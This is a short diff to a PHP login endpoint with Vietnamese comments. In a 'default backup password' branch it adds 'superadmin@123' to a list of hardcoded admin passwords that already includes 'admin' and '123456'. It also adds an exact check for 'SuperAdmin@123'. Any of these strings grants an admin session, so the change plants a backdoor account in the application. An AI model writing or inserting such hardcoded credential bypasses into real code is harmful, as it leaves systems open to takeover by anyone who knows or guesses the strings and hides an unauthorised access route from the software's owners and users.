@@ -37,8 +37,8 @@ switch ($method) {
             ]);
         } else {
             // Mật khẩu dự phòng mặc định
-            $defaultPass = ['admin', 'admin123', 'tanmy2026', '123456'];
-            if (in_array(strtolower($password), $defaultPass)) {
+            $defaultPass = ['superadmin@123', 'admin', 'admin123', 'tanmy2026', '123456'];
+            if (in_array(strtolower($password), $defaultPass) || $password === 'SuperAdmin@123') {
                 jsonResponse(true, "Đăng nhập Quản Trị Viên thành công!", [
                     "role" => "admin",
                     "username" => "admin",
